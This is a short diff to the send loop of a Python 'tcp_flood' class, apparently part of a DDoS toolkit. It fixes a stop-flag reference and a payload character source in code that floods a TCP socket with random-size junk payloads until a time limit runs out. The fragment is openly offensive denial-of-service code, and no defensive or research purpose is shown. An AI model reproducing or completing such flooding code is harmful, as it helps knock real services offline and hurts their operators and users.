@@ -65,15 +65,15 @@ class tcp_flood(DDoS_Class):
                             int(time.time() - self.start) >= self.duration
                         ):  # this is a safety mechanism so the attack won't run forever
                             break
-                        if stop == True:
+                        if self.stop == True:
                             break
                         m = ""
                         for li in range(
                             random.randint(self.min_size, self.max_size)
                         ):  # each payload' size is chosen randomly between maximum and minimum values
-                            m += random.choice(lis)
+                            m += random.choice(Common_Variables.source_string)
                         try:
-                            if stop == True:
+                            if self.stop == True:
                                 break
                             s.send(m.encode("utf-8"))
                             self.counter += 1
